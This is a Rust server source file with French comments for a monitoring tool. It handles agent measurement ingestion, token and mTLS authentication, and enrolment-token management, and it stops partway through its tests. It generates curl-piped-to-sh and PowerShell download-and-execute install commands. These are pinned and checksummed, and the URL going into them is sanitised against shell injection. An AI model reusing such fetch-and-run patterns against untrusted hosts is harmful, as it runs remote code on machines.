//! Réception des mesures poussées par les agents, et gestion de leurs jetons.
//!
//! **Cette route ne s'authentifie pas par la session de l'interface.** Un agent
//! est un programme installé sur une machine distante : il présente un jeton
//! d'enregistrement dans `Authorization: Bearer …`, et rien d'autre. Si un
//! contrôle de session est appliqué à `/api/**`, `/api/ingest` doit en être
//! explicitement exempté, sans quoi plus aucune machine ne pourra remonter quoi
//! que ce soit.
//!
//! Les routes de jetons, elles, sont des routes d'administration ordinaires : la
//! session de l'interface doit les protéger comme les autres.

use std::sync::LazyLock;

use axum::extract::rejection::JsonRejection;
use axum::extract::{Path, Query, State};
use axum::http::{HeaderMap, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::{Extension, Json};
use dumbmonit_collectors::log_gate::LogGate;
use dumbmonit_proto::{AGENT_SECRET_HEADER, PushBatch, TargetId};
use serde::{Deserialize, Serialize};
use serde_json::json;

use crate::agent_tls::AgentCert;
use crate::api::{ApiError, ApiResult};
use crate::auth::audit;
use crate::auth::client_ip::ClientIp;
use crate::auth::clients;
use crate::auth::middleware::{AdminIdentity, Authenticated};
use crate::collectors::agent;
use crate::state::AppState;

/// Refus d'un lot dont l'identité n'est pas celle du certificat client.
pub const CERT_OF_ANOTHER_MACHINE: &str =
    "This agent certificate belongs to another machine: the batch is refused.";

/// Refus d'agents déjà journalisés : une ligne par client et par cause, pas une
/// par tentative — un agent au jeton révoqué réessaie toutes les 30 s.
static REFUSALS: LazyLock<LogGate> = LazyLock::new(LogGate::new);

/// Journalise un refus opposé à un agent, une fois par client et par cause.
/// `who` : adresse du client, suivie du nom de la machine quand on le connaît.
fn note_refusal(who: &str, status: StatusCode, reason: &str) {
    if REFUSALS.report(who, &format!("{} {reason}", status.as_u16())).is_some() {
        tracing::info!(client = who, status = status.as_u16(), reason, "agent report refused");
    }
}

/// Adresse lisible d'un client, pour les journaux.
fn client_label(ip: ClientIp) -> String {
    ip.0.map_or_else(|| "unknown".to_string(), |ip| ip.to_string())
}

/// Réponse d'erreur de l'ingestion.
///
/// `ApiError` ne sait pas dire « 401 » : jusqu'ici, l'API n'était appelée que par
/// l'interface, où un refus d'authentification n'existait pas. Plutôt que d'y
/// toucher — le fichier est partagé — cette route porte sa propre traduction, avec
/// exactement le même corps `{"error": …}` que le reste de l'API.
pub struct IngestRejection {
    status: StatusCode,
    message: String,
}

impl IntoResponse for IngestRejection {
    fn into_response(self) -> Response {
        (self.status, Json(json!({ "error": self.message }))).into_response()
    }
}

impl From<agent::IngestError> for IngestRejection {
    fn from(error: agent::IngestError) -> Self {
        match error {
            agent::IngestError::Unauthorized => Self {
                status: StatusCode::UNAUTHORIZED,
                message: "Enrollment token missing, unknown or revoked.".to_string(),
            },
            agent::IngestError::Forbidden(why) => {
                Self { status: StatusCode::FORBIDDEN, message: why }
            }
            agent::IngestError::BadRequest(why) => {
                Self { status: StatusCode::BAD_REQUEST, message: why }
            }
            agent::IngestError::Internal(error) => {
                // Même politique que `ApiError` : la panne est journalisée en
                // entier, mais son détail ne part pas sur le réseau.
                tracing::error!(?error, "internal error during ingestion");
                Self {
                    status: StatusCode::INTERNAL_SERVER_ERROR,
                    message: "Internal server error.".to_string(),
                }
            }
        }
    }
}

/// Refuse une requête d'agent sans jeton valide *avant* d'en lire le corps.
///
/// Les routes d'agent acceptent des corps de 16 Mio ; sans cette garde, le
/// corps serait lu et désérialisé par l'extracteur `Json` avant que le
/// gestionnaire ne regarde le jeton — n'importe qui joignant le port pourrait
/// faire travailler le serveur à vide. Le gestionnaire revérifie le jeton : ce
/// contrôle-ci ne fait que trier tôt.
pub async fn require_agent_token(
    State(state): State<AppState>,
    ip: ClientIp,
    request: axum::extract::Request,
    next: axum::middleware::Next,
) -> Response {
    let bearer = request
        .headers()
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|value| value.to_str().ok());
    match agent::authenticate_token(&state.pool, bearer).await {
        Ok(Some(_)) => {
            // Sur le port de l'interface (pas de certificat client) : l'ancien
            // canal, refusé quand l'administrateur exige mTLS. Le refus
            // annonce le canal chiffré, comme toute réponse faite à un agent
            // authentifié : un agent à jour y migre de lui-même.
            let legacy = request.extensions().get::<crate::agent_tls::AgentCert>().is_none();
            let mut response = if legacy {
                match crate::agent_tls::mtls_required(&state).await {
                    Ok(true) => {
                        let reason = "plain agent channel refused (mTLS required)";
                        note_refusal(&client_label(ip), StatusCode::FORBIDDEN, reason);
                        IngestRejection {
                            status: StatusCode::FORBIDDEN,
                            message: dumbmonit_proto::MTLS_REQUIRED.to_string(),
                        }
                        .into_response()
                    }
                    Ok(false) => next.run(request).await,
                    Err(error) => {
                        return IngestRejection::from(agent::IngestError::Internal(error))
                            .into_response();
                    }
                }
            } else {
                next.run(request).await
            };
            if let Some(offer) = crate::agent_tls::offer(&state)
                && let Ok(value) = HeaderValue::from_str(&offer.to_header())
            {
                response.headers_mut().insert(dumbmonit_proto::AGENT_TLS_HEADER, value);
            }
            response
        }
        Ok(None) => {
            let reason = "enrolment token missing, unknown or revoked";
            note_refusal(&client_label(ip), StatusCode::UNAUTHORIZED, reason);
            IngestRejection::from(agent::IngestError::Unauthorized).into_response()
        }
        Err(error) => IngestRejection::from(agent::IngestError::Internal(error)).into_response(),
    }
}

/// Réception d'un lot de mesures.
///
/// `POST /api/ingest`, corps [`PushBatch`], réponse [`dumbmonit_proto::PushAck`].
pub async fn receive(
    State(state): State<AppState>,
    ip: ClientIp,
    headers: HeaderMap,
    cert: Option<Extension<AgentCert>>,
    batch: Result<Json<PushBatch>, JsonRejection>,
) -> Response {
    let client = client_label(ip);
    let batch = match batch {
        Ok(Json(batch)) => batch,
        Err(rejection) => {
            // Corps trop gros (413), illisible ou mal typé : l'agent ne le saura
            // que par son propre journal, le serveur le dit aussi.
            note_refusal(&client, rejection.status(), &rejection.body_text());
            return rejection.into_response();
        }
    };
    let bearer =
        headers.get(axum::http::header::AUTHORIZATION).and_then(|value| value.to_str().ok());
    // Le secret de liaison voyage dans son propre en-tête : il dit *quelle*
    // machine parle, là où le jeton dit seulement qu'elle a le droit de parler.
    let secret = headers.get(AGENT_SECRET_HEADER).and_then(|value| value.to_str().ok());
    let who = format!("{client} {}", batch.identity.hostname);
    let version = batch.identity.agent_version.clone();
    let identity = batch.identity.clone();
    let cert = cert.map(|Extension(cert)| cert);
    let declared = batch.declared_monitors.clone();
    let hostname = batch.identity.hostname.clone();

    // Sur le canal chiffré, le certificat dit quelle machine parle : un lot au
    // nom d'une autre est refusé avant d'avoir rien écrit.
    if let Some(cert) = &cert {
        match agent::target_of_key(&state.pool, &batch.identity.key()).await {
            Ok(Some(target)) if target == cert.target_id => {}
            Ok(_) => {
                note_refusal(&who, StatusCode::FORBIDDEN, "certificate of another machine");
                return IngestRejection {
                    status: StatusCode::FORBIDDEN,
                    message: CERT_OF_ANOTHER_MACHINE.to_string(),
                }
                .into_response();
            }
            Err(error) => {
                return IngestRejection::from(agent::IngestError::Internal(error)).into_response();
            }
        }
    }

    match agent::ingest(&state.pool, &state.cipher, &state.sink, bearer, secret, batch).await {
        Ok(mut ack) => {
            if let Err(error) =
                crate::agent_tls::note_channel(&state.pool, ack.target_id, cert.as_ref()).await
            {
                tracing::debug!(%error, "agent channel not recorded");
            }
            // Moniteurs déclarés par les étiquettes Docker : sans effet si le module
            // Docker est décoché pour cette machine.
            if let Some(declared) = declared
                && !ack.disabled_modules.iter().any(|module| module == "docker")
            {
                super::label_monitors::on_batch(&state, ack.target_id, &hostname, declared).await;
            }
            // Mise à jour automatique de l'agent : ce qu'il dit de son binaire,
            // puis l'offre du binaire de ce build si elle est de mise. Une
            // panne ici ne coûte jamais le lot.
            let target_id = ack.target_id;
            if let Err(error) = agent::selfupdate::record(&state.pool, target_id, &identity).await {
                tracing::warn!(error = %format!("{error:#}"), "agent update state not recorded");
            }
            match agent::selfupdate::offer_for(&state, target_id).await {
                Ok(offer) => ack.agent_update = offer,
                Err(error) => {
                    tracing::warn!(error = %format!("{error:#}"), "agent update offer skipped");
                }
            }
            // Mode sentinelle : le réglage et son canal secret ne partent que
            // vers la machine désignée, et que sur le canal chiffré.
            match agent::sentinel::load(&state.pool, &state.cipher, target_id).await {
                Ok(Some(stored)) => {
                    ack.sentinel = Some(agent::sentinel::for_agent(stored, cert.is_some()));
                }
                Ok(None) => {}
                Err(error) => {
                    tracing::warn!(error = %format!("{error:#}"), "sentinel setting skipped");
                }
            }
            if REFUSALS.clear(&who) {
                tracing::info!(client = who, "agent reports accepted again");
            }
            REFUSALS.clear(&client);
            Json(ack).into_response()
        }
        Err(error) => {
            let rejection = IngestRejection::from(error);
            // Une panne interne est déjà journalisée en erreur, en entier.
            if rejection.status != StatusCode::INTERNAL_SERVER_ERROR {
                let reason = format!("{} (agent {version})", rejection.message);
                note_refusal(&who, rejection.status, &reason);
            }
            rejection.into_response()
        }
    }
}

/// Un jeton tel que l'interface peut l'afficher : jamais le secret.
#[derive(Debug, Serialize)]
pub struct TokenView {
    pub id: i64,
    pub name: String,
    /// Début du jeton, pour l'identifier dans une liste.
    pub prefix: String,
    pub created_at: String,
    pub last_used_at: Option<String>,
    pub revoked_at: Option<String>,
    /// Machines que ce jeton peut encore enrôler en tout. `null` : un jeton de
    /// parc, sans limite de nombre.
    pub max_uses: Option<i64>,
    /// Machines déjà enrôlées avec ce jeton.
    pub uses: i64,
    /// Terme au-delà duquel le jeton n'enrôle plus. Les machines déjà enrôlées
    /// continuent de remonter leurs mesures.
    pub expires_at: Option<String>,
    /// Jeton de relais : la machine enrôlée devient relais de son site.
    pub relay: bool,
    pub relay_site: Option<String>,
    /// Jeton de flotte Active Directory : domaine auquel il est limité.
    pub ad_domain: Option<String>,
    /// Mode MSP : le client chez lequel ce jeton enrôle.
    pub client_id: i64,
}

impl From<agent::TokenRecord> for TokenView {
    fn from(record: agent::TokenRecord) -> Self {
        Self {
            id: record.id,
            name: record.name,
            prefix: record.prefix,
            created_at: record.created_at,
            last_used_at: record.last_used_at,
            revoked_at: record.revoked_at,
            max_uses: record.max_uses,
            uses: record.uses,
            expires_at: record.expires_at,
            relay: record.relay,
            relay_site: record.relay_site,
            ad_domain: record.ad_domain,
            client_id: clients::DEFAULT_CLIENT,
        }
    }
}

/// Réponse à la création d'un jeton.
///
/// C'est la seule et unique occasion de voir le jeton en clair : la base n'en
/// garde que l'empreinte. L'interface doit donc l'afficher immédiatement, avec la
/// commande d'installation toute faite.
#[derive(Debug, Serialize)]
pub struct CreatedToken {
    #[serde(flatten)]
    pub token: TokenView,
    /// Le jeton, en clair, pour cette réponse seulement.
    pub secret: String,
    pub install_linux: String,
    pub install_windows: String,
}

#[derive(Debug, Deserialize)]
pub struct TokenPayload {
    pub name: String,
    /// URL par laquelle les agents joindront ce serveur.
    ///
    /// Fournie par l'interface, qui est la seule à la connaître : le serveur, lui,
    /// ne voit que son adresse d'écoute, souvent `0.0.0.0` derrière un proxy.
    #[serde(default)]
    pub base_url: Option<String>,
    /// Jeton réutilisable pour tout un parc. Absent : usage unique.
    ///
    /// Un jeton de parc est parfaitement légitime — c'est ce qu'on colle dans un
    /// playbook Ansible. Mais c'en est un qui ouvre autant de machines qu'on
    /// veut : ce doit être une décision, pas le comportement par défaut.
    #[serde(default)]
    pub reusable: bool,
    /// Nombre d'enrôlements permis pour un jeton réutilisable. Absent : sans
    /// limite. Ignoré pour un jeton à usage unique.
    #[serde(default)]
    pub max_uses: Option<i64>,
    /// Jours avant que le jeton cesse d'enrôler. Absent : sans terme.
    #[serde(default)]
    pub expires_in_days: Option<i64>,
    /// Jeton de relais : la machine enrôlée relaie les sondes de son site dès
    /// son premier lot, sans rien éditer sur elle.
    #[serde(default)]
    pub relay: bool,
    /// Site de ce relais (« Agence de Lyon »). Ignoré sans `relay`.
    #[serde(default)]
    pub site: Option<String>,
    /// Mode MSP : le client chez lequel le jeton enrôle. Absent : le client par
    /// défaut.
    #[serde(default)]
    pub client_id: Option<i64>,
    /// Installation à travers un agent relais (site derrière un pare-feu) : les
    /// commandes visent sa passerelle, que le serveur ouvre au besoin.
    #[serde(default)]
    pub relay_id: Option<TargetId>,
    /// Adresse par laquelle les machines du site joignent ce relais. Absente :
    /// celle déjà réglée, à défaut son nom d'hôte.
    #[serde(default)]
    pub relay_host: Option<String>,
}

impl TokenPayload {
    /// Portée effective du jeton, telle que le magasin l'attend.
    fn policy(&self) -> Result<agent::TokenPolicy, ApiError> {
        let max_uses = match (self.reusable, self.max_uses) {
            (false, _) => Some(1),
            (true, None) => None,
            (true, Some(count)) if count >= 1 => Some(count),
            (true, Some(_)) => {
                return Err(ApiError::BadRequest(
                    "A reusable token must allow at least one enrolment.".into(),
                ));
            }
        };
        if self.expires_in_days.is_some_and(|days| days < 1) {
            return Err(ApiError::BadRequest(
                "The enrolment deadline must be at least one day away.".into(),
            ));
        }
        Ok(agent::TokenPolicy { max_uses, expires_in_days: self.expires_in_days })
    }
}

/// Réservé aux administrateurs, comme la liste des jetons d'API.
pub async fn list_tokens(
    _: AdminIdentity,
    State(state): State<AppState>,
) -> ApiResult<Json<Vec<TokenView>>> {
    let tokens = agent::list_tokens(&state.pool).await?;
    let owners = clients::owners(&state.pool, clients::Kind::AgentToken).await?;
    Ok(Json(
        tokens
            .into_iter()
            .map(|record| {
                let client = owners.get(&record.id).copied();
                let mut view = TokenView::from(record);
                view.client_id = client.unwrap_or(clients::DEFAULT_CLIENT);
                view
            })
            .collect(),
    ))
}

pub async fn create_token(
    State(state): State<AppState>,
    Authenticated(me): Authenticated,
    ClientIp(ip): ClientIp,
    Json(payload): Json<TokenPayload>,
) -> ApiResult<(StatusCode, Json<CreatedToken>)> {
    let name = payload.name.trim().to_string();
    if name.is_empty() {
        return Err(ApiError::BadRequest("Token name is required.".into()));
    }

    let site = agent::clean_site(payload.site.as_deref());
    let max = agent::MAX_SITE_LEN;
    if site.as_ref().is_some_and(|s| s.chars().count() > max) {
        return Err(ApiError::BadRequest(format!("Site name is limited to {max} characters.")));
    }
    let client = payload.client_id.unwrap_or(clients::DEFAULT_CLIENT);
    if !clients::exists(&state.pool, client).await? {
        return Err(ApiError::BadRequest("This client does not exist.".into()));
    }
    if payload.relay && payload.relay_id.is_some() {
        return Err(ApiError::BadRequest(
            "A relay connects to the server directly: it cannot be installed through another relay."
                .into(),
        ));
    }
    let route = match payload.relay_id {
        Some(relay) => {
            Some(relay_route(&state, relay, payload.relay_host.as_deref(), Some(client)).await?)
        }
        None => None,
    };
    let policy = payload.policy()?;
    if let Some(route) = &route {
        // Choisir ce relais pour une installation, c'est lui demander d'ouvrir
        // sa passerelle : il l'ouvre à son prochain lot.
        agent::set_relay_gateway(&state.pool, route.relay_id, Some(route.port), Some(&route.host))
            .await?;
    }
    let (mut record, secret) = agent::create_token(&state.pool, &name, policy).await?;
    clients::assign(&state.pool, clients::Kind::AgentToken, &[record.id], Some(client))
        .await
        .map_err(super::clients::api_error)?;
    if payload.relay {
        agent::set_token_relay(&state.pool, record.id, site.as_deref()).await?;
        record.relay = true;
        record.relay_site = site;
    }
    audit::record(&state.pool, Some(&me.username), "agent_token.created", Some(&name), ip).await;
    let params = install_parameters_via(&state, payload.base_url.as_deref(), route).await;

    let mut token = TokenView::from(record);
    token.client_id = client;
    Ok((
        StatusCode::CREATED,
        Json(CreatedToken {
            install_linux: params.linux_command(&secret),
            install_windows: params.windows_command(&secret),
            token,
            secret,
        }),
    ))
}

/// Tout ce qu'une commande d'installation porte, hormis le jeton.
///
/// Source unique des commandes affichées par l'interface (création d'un jeton)
/// et de tout générateur de déploiement (script GPO, Ansible…) : ceux-ci lisent
/// `GET /api/agent/install` et remplacent `{TOKEN}` dans les gabarits, ou
/// appellent [`install_parameters_via`] côté serveur.
#[derive(Debug, Clone, Serialize)]
pub struct InstallParams {
    /// URL `https://` d'où viennent scripts d'installation et binaires : le
    /// port de l'interface, ou la passerelle d'un relais.
    pub base_url: String,
    /// URL du canal chiffré des agents (`https://hôte:8443`), s'il est ouvert.
    pub agent_url: Option<String>,
    /// Empreinte SHA-256 de l'autorité du canal, que l'agent épingle.
    pub ca_pin: Option<String>,
    /// Empreintes SHA-256 des binaires livrés, par plateforme.
    pub checksums: Vec<InstallChecksum>,
    /// Commande Unix, jeton à remplacer : `{TOKEN}`.
    pub linux_template: String,
    /// Commande PowerShell, jeton à remplacer : `{TOKEN}`.
    pub windows_template: String,
    /// Relais par lequel passent ces commandes, s'il y en a un : `base_url` et
    /// `agent_url` sont alors ceux de sa passerelle.
    pub via_relay: Option<RelayRoute>,
    /// Clé publique épinglée (`sha256//…`) du certificat que présente
    /// `base_url`, quand il n'est pas d'une autorité de confiance : celle du
    /// certificat autosigné de l'interface, ou celle du canal des agents à
    /// travers un relais. Les deux commandes vérifient le serveur par elle
    /// (`curl --pinnedpubkey`, rappel de validation en PowerShell) avant de
    /// lire le moindre octet, puis l'agent la garde (`server_pin`). `None` :
    /// certificat fourni, vérifié par les autorités du système.
    pub https_pin: Option<String>,
}

/// Passage par un agent relais : sa passerelle, telle que les machines du site
/// la joignent.
#[derive(Debug, Clone, Serialize)]
pub struct RelayRoute {
    pub relay_id: TargetId,
    pub relay_name: String,
    pub site: Option<String>,
    /// Adresse du relais vue du site (IP ou nom local).
    pub host: String,
    pub port: u16,
    /// Vrai si le relais déclare déjà écouter sur ce port.
    pub listening: bool,
}

/// Résout le passage par `relay` : un agent en mode relais, du client donné
/// (`None` : sans contrôle, lecture seule), avec l'adresse de sa passerelle.
pub async fn relay_route(
    state: &AppState,
    relay: TargetId,
    host: Option<&str>,
    client: Option<i64>,
) -> ApiResult<RelayRoute> {
    let not_relay = || ApiError::BadRequest(format!("Monitor {relay} is not a relay agent."));
    let info = agent::host(&state.pool, relay).await?.ok_or_else(not_relay)?;
    if !(info.relay || info.relay_wanted) {
        return Err(ApiError::BadRequest(
            "This agent is not a relay: switch relay mode on for it first.".into(),
        ));
    }
    if let Some(client) = client
        && clients::target_client(&state.pool, relay).await? != Some(client)
    {
        return Err(ApiError::BadRequest(
            "This relay belongs to another client: pick a relay of the same client.".into(),
        ));
    }
    let typed = agent::clean_gateway_host(host).map_err(|e| ApiError::BadRequest(e.into()))?;
    let host = match typed {
        Some(host) => host,
        None => match info.relay_gateway_host.clone() {
            Some(host) => host,
            None => {
                agent::clean_gateway_host(Some(&info.hostname)).ok().flatten().ok_or_else(|| {
                    ApiError::BadRequest("Give the address the site reaches this relay at.".into())
                })?
            }
        },
    };
    let port = info
        .relay_gateway_wanted
        .or(info.relay_gateway_port)
        .unwrap_or(dumbmonit_proto::DEFAULT_RELAY_GATEWAY_PORT);
    let relay_name: String = sqlx::query_scalar("SELECT name FROM targets WHERE id = ?")
        .bind(relay)
        .fetch_one(&state.pool)
        .await
        .map_err(anyhow::Error::from)?;
    Ok(RelayRoute {
        relay_id: relay,
        relay_name,
        site: info.site.clone().or(info.relay_wanted_site.clone()),
        listening: info.relay_gateway_port == Some(port),
        host,
        port,
    })
}

#[derive(Debug, Clone, Serialize)]
pub struct InstallChecksum {
    pub platform: String,
    pub sha256: String,
}

/// Marque du jeton dans les gabarits de [`InstallParams`].
pub const TOKEN_PLACEHOLDER: &str = "{TOKEN}";

impl InstallParams {
    fn pairs(&self, windows: bool) -> Vec<(String, String)> {
        self.checksums
            .iter()
            .filter(|sum| sum.platform.starts_with("windows-") == windows)
            .map(|sum| (sum.platform.clone(), sum.sha256.clone()))
            .collect()
    }

    /// Commande Unix complète pour ce jeton.
    pub fn linux_command(&self, token: &str) -> String {
        let mut command =
            install_linux(&self.base_url, token, &self.pairs(false), self.https_pin.as_deref());
        if let (Some(url), Some(pin)) = (&self.agent_url, &self.ca_pin) {
            command.push_str(&format!(" --tls-url={url} --ca-pin={pin}"));
        }
        command
    }

    /// Commande PowerShell complète pour ce jeton.
    pub fn windows_command(&self, token: &str) -> String {
        let mut command =
            install_windows(&self.base_url, token, &self.pairs(true), self.https_pin.as_deref());
        if let (Some(url), Some(pin)) = (&self.agent_url, &self.ca_pin) {
            command.push_str(&format!(" -TlsUrl {url} -CaPin {pin}"));
        }
        command
    }
}

/// Paramètres d'installation pour une URL de base donnée (celle par laquelle
/// les machines joignent l'interface ; à défaut, l'adresse d'écoute), en direct
/// ou à travers un agent relais : scripts, binaires et canal chiffré passent
/// alors par sa passerelle, qui mène en TLS jusqu'au port des agents du
/// serveur — l'épingle est alors celle de ce port.
pub async fn install_parameters_via(
    state: &AppState,
    base_url: Option<&str>,
    route: Option<RelayRoute>,
) -> InstallParams {
    let base_url = match &route {
        Some(route) => format!("https://{}:{}", route.host, route.port),
        None => normalise_base_url(base_url, state.config.bind),
    };
    let https_pin = match &route {
        Some(_) => state.agent_tls().server_pin(),
        None => web_pin(state),
    };
    let checksums = crate::api::agent_files::platform_checksums(&state.config.agent_dir)
        .await
        .into_iter()
        .map(|(platform, sha256)| InstallChecksum { platform, sha256 })
        .collect();
    let offer = crate::agent_tls::offer(state);
    let agent_url = match &route {
        Some(_) => offer.as_ref().map(|_| base_url.clone()),
        None => offer
            .as_ref()
            .and_then(|offer| dumbmonit_proto::agent_channel_url(&base_url, offer.port)),
    };
    // L'autorité active seule : une suivante (rotation en cours) est apprise
    // par le canal chiffré lui-même.
    let ca_pin = offer.and_then(|offer| offer.pins.into_iter().next());
    let mut params = InstallParams {
        base_url,
        agent_url,
        ca_pin,
        checksums,
        linux_template: String::new(),
        windows_template: String::new(),
        https_pin,
        via_relay: route,
    };
    params.linux_template = params.linux_command(TOKEN_PLACEHOLDER);
    params.windows_template = params.windows_command(TOKEN_PLACEHOLDER);
    params
}

/// Clé à épingler pour joindre le port de l'interface : celle du certificat
/// autosigné. Un certificat fourni est vérifié par les autorités du système.
fn web_pin(state: &AppState) -> Option<String> {
    let summary = state.web_tls().summary()?;
    match summary.source {
        crate::web_tls::Source::SelfSigned => summary.public_key_pin,
        crate::web_tls::Source::Provided => None,
    }
}

#[derive(Debug, Deserialize)]
pub struct InstallQuery {
    #[serde(default)]
    pub base_url: Option<String>,
    /// Commandes à travers ce relais.
    #[serde(default)]
    pub relay_id: Option<TargetId>,
    #[serde(default)]
    pub relay_host: Option<String>,
}

/// `GET /api/agent/install?base_url=…` : paramètres et gabarits de la commande
/// d'installation, sans jeton.
///
/// Rien de secret : l'URL, l'empreinte publique de l'autorité, celles des
/// binaires. Ouverte à toute session et aux jetons `read`.
pub async fn install_params(
    State(state): State<AppState>,
    Query(query): Query<InstallQuery>,
) -> ApiResult<Json<InstallParams>> {
    let route = match query.relay_id {
        Some(relay) => Some(relay_route(&state, relay, query.relay_host.as_deref(), None).await?),
        None => None,
    };
    Ok(Json(install_parameters_via(&state, query.base_url.as_deref(), route).await))
}

/// `GET /api/agent/tokens/{id}/machines` : machines enrôlées par ce jeton, la
/// plus récente d'abord. Le flux d'ajout d'un agent l'interroge pour constater
/// la première connexion, puis nommer et ranger la machine sur place.
pub async fn token_machines(
    _: AdminIdentity,
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> ApiResult<Json<Vec<agent::TokenMachine>>> {
    Ok(Json(agent::token_machines(&state.pool, id).await?))
}

pub async fn revoke_token(
    State(state): State<AppState>,
    Authenticated(me): Authenticated,
    ClientIp(ip): ClientIp,
    Path(id): Path<i64>,
) -> ApiResult<StatusCode> {
    if agent::revoke_token(&state.pool, id).await? {
        let subject = id.to_string();
        audit::record(&state.pool, Some(&me.username), "agent_token.revoked", Some(&subject), ip)
            .await;
        Ok(StatusCode::NO_CONTENT)
    } else {
        Err(ApiError::NotFound(format!("Token {id} not found or already revoked.")))
    }
}

/// URL de base à écrire dans la commande d'installation : toujours en
/// `https://`, le port ne servant que HTTPS.
///
/// Elle vient du navigateur et finit dans une commande que l'administrateur
/// colle dans un terminal : seuls les caractères d'une URL ordinaire y entrent
/// (ni blanc, ni `;`, `|`, `$`, guillemet…). Sinon, ou sans URL fournie,
/// repli honnête sur l'adresse d'écoute : juste sur un réseau local, et
/// visiblement fausse — donc corrigeable — derrière un mandataire.
fn normalise_base_url(provided: Option<&str>, bind: std::net::SocketAddr) -> String {
    let fallback = || format!("https://{bind}");
    let Some(url) = provided.map(str::trim).filter(|url| !url.is_empty()) else {
        return fallback();
    };
    let url = url.trim_end_matches('/');
    let (scheme, rest) = url.split_once("://").unwrap_or(("https", url));
    // Une adresse en clair (copiée d'un ancien lien) : même hôte, en HTTPS.
    if !matches!(scheme.to_ascii_lowercase().as_str(), "https" | "http") {
        return fallback();
    }
    let safe = |b: u8| b.is_ascii_alphanumeric() || b"-._~:/[]%".contains(&b);
    if rest.is_empty() || rest.starts_with('/') || !rest.bytes().all(safe) {
        return fallback();
    }
    format!("https://{rest}")
}

/// En-tête `SubjectPublicKeyInfo` d'une clé P-256 (celles du certificat
/// autosigné et du canal des agents), en octets décimaux : PowerShell refait
/// l'épingle `sha256//…` de curl à partir du point de la clé.
const P256_SPKI_PREFIX: &str =
    "48,89,48,19,6,7,42,134,72,206,61,2,1,6,8,42,134,72,206,61,3,1,7,3,66,0";

/// Une épingle telle que la produit [`crate::web_tls::cert::spki_pin`] : rien
/// d'autre n'entre dans une commande.
fn clean_pin(pin: Option<&str>) -> Option<&str> {
    let base64 = |b: &u8| b.is_ascii_alphanumeric() || *b == b'+' || *b == b'/';
    pin.filter(|pin| {
        let digest = pin.strip_prefix("sha256//").unwrap_or_default().as_bytes();
        digest.len() == 44 && digest[43] == b'=' && digest[..43].iter().all(base64)
    })
}

/// Commande d'installation Unix. Elle porte l'empreinte de chaque binaire Unix
/// que l'image livre (`--sha256=linux-x86_64:…,…`) : le script refuse un
/// téléchargement qui n'y correspond pas, ou pour lequel elle manque.
fn install_linux(
    base_url: &str,
    token: &str,
    checksums: &[(String, String)],
    https_pin: Option<&str>,
) -> String {
    let mut command = match clean_pin(https_pin) {
        // `-k` lève la vérification par une autorité, que le certificat
        // autosigné ne peut pas passer ; `--pinnedpubkey` la remplace par la
        // clé attendue, et le script fait de même pour le binaire.
        Some(pin) => format!(
            "curl -sSL -k --pinnedpubkey {pin} {base_url}/install.sh | sh -s -- \
             --token={token} --url={base_url} --pinned-key={pin}"
        ),
        None => {
            format!("curl -sSL {base_url}/install.sh | sh -s -- --token={token} --url={base_url}")
        }
    };
    let unix: Vec<String> = checksums
        .iter()
        .filter(|(platform, _)| !platform.starts_with("windows-"))
        .map(|(platform, digest)| format!("{platform}:{digest}"))
        .collect();
    if !unix.is_empty() {
        command.push_str(&format!(" --sha256={}", unix.join(",")));
    }
    command
}

/// Commande d'installation PowerShell. TLS 1.2 est d'abord autorisé (Windows
/// PowerShell 5 ne le propose pas toujours). Avec une épingle, un rappel de
/// validation n'accepte que le certificat dont la clé publique a cette
/// empreinte, avant que le script ne soit lu ; l'installateur le garde pour le
/// binaire, l'écrit dans la configuration de l'agent, puis le retire.
fn install_windows(
    base_url: &str,
    token: &str,
    checksums: &[(String, String)],
    https_pin: Option<&str>,
) -> String {
    const TLS12: &str = "[Net.ServicePointManager]::SecurityProtocol = \
                         [Net.ServicePointManager]::SecurityProtocol -bor 3072";
    // `iex` ne sait pas passer d'arguments : il faut construire un bloc de script.
    // C'est la formule consacrée pour un installateur PowerShell paramétré.
    let mut command = match clean_pin(https_pin) {
        Some(pin) => format!(
            "{TLS12}; [Net.ServicePointManager]::ServerCertificateValidationCallback = \
             {{ param($s, $c) ('sha256//' + [Convert]::ToBase64String(\
             [Security.Cryptography.SHA256]::Create().ComputeHash(\
             [byte[]](({P256_SPKI_PREFIX}) + $c.GetPublicKey())))) -ceq '{pin}' }}; \
             & ([scriptblock]::Create((New-Object Net.WebClient).DownloadString(\
             '{base_url}/install.ps1'))) -Token {token} -Url {base_url} -PinnedKey {pin}"
        ),
        None => format!(
            "{TLS12}; & ([scriptblock]::Create((irm {base_url}/install.ps1))) \
             -Token {token} -Url {base_url}"
        ),
    };
    let windows: Vec<String> = checksums
        .iter()
        .filter(|(platform, _)| platform.starts_with("windows-"))
        .map(|(platform, digest)| format!("{platform}:{digest}"))
        .collect();
    if !windows.is_empty() {
        command.push_str(&format!(" -Sha256 {}", windows.join(",")));
    }
    command
}

#[cfg(test)]
mod tests {
    use super::*;

    fn payload(json: &str) -> TokenPayload {
        serde_json::from_str(json).expect("désérialisation")
    }

    /// `ApiError` ne dérive pas `Debug` — il porte des messages destinés au
    /// réseau, pas au débogage. Les tests le déplient donc à la main.
    fn scope(json: &str) -> agent::TokenPolicy {
        match payload(json).policy() {
            Ok(policy) => policy,
            Err(_) => panic!("portée refusée alors qu'elle est valide : {json}"),
        }
    }

    #[test]
    fn a_token_is_single_use_unless_someone_asks_for_more() {
        // Le défaut, c'est-à-dire ce qui se passe quand personne n'y pense.
        let policy = scope(r#"{"name": "portable"}"#);
        assert_eq!(policy.max_uses, Some(1));
        assert_eq!(policy.expires_in_days, None);

        // Un parc, explicitement.
        let policy = scope(r#"{"name": "parc", "reusable": true}"#);
        assert_eq!(policy.max_uses, None, "sans limite de nombre");

        let policy = scope(r#"{"name": "parc", "reusable": true, "max_uses": 20}"#);
        assert_eq!(policy.max_uses, Some(20));

        let policy = scope(r#"{"name": "parc", "reusable": true, "expires_in_days": 7}"#);
        assert_eq!(policy.expires_in_days, Some(7));
    }

    #[test]
    fn a_scope_that_would_enrol_nothing_is_refused_rather_than_created() {
        assert!(payload(r#"{"name": "x", "reusable": true, "max_uses": 0}"#).policy().is_err());
        assert!(payload(r#"{"name": "x", "expires_in_days": 0}"#).policy().is_err());
        // Un compte sur un jeton à usage unique n'a pas de sens, mais n'est pas
        // une erreur : c'est simplement sans effet.
        assert_eq!(scope(r#"{"name": "x", "max_uses": 9}"#).max_uses, Some(1));
    }

    #[test]
    fn the_provided_base_url_is_used_without_its_trailing_slash() {
